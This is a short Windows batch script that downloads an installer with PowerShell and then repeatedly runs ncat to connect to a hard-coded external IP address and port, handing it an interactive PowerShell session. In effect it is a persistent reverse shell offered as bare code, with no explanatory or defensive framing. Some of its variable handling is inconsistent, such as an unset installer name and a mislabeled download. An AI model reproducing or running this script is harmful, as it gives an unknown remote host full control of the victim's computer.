@echo off
setlocal

:: Check if ncat is installed
where ncat >nul 2>&1
if %errorlevel%==0 (
    goto ncat
)

:: Set variables
set "url=https://npcap.com/dist/npcap-1.79.exe"
set "npcap_installer=ncat.exe"
set "tempdir=%temp%\nmap_installer"

:: Create a temporary directory for the installer
if not exist "%tempdir%" (
    mkdir "%tempdir%"
)

:: Download the installer
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %tempdir%\%installer%"

:: Check if the download was successful
if not exist "%tempdir%\%installer%" (
    echo Error Code 2
    goto :eof
)

:ncat
set "host=147.185.221.20"
set "port=45895"
%tempdir%\ncat %host% %port% -e powershell
goto ncat

:end
endlocal
